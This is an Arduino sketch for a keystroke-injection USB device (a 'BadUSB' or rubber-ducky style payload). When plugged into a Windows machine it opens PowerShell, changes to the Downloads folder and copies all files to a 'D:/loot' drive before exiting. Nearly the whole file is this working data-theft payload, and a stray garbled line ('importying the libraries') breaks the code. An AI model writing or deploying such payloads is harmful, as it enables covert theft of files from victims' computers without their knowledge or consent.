#include <Keyboard.h>
importying the libraries
void typeKey(uint8_t  key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();

  delay(500);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cd Downloads");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cp * D:/loot");
  
  typeKey(KEY_RETURN);

  delay(15000);

  Keyboard.print("exit");

  delay(500);
  
  typeKey(KEY_RETURN);

  Keyboard.end();

  delay(500);
}
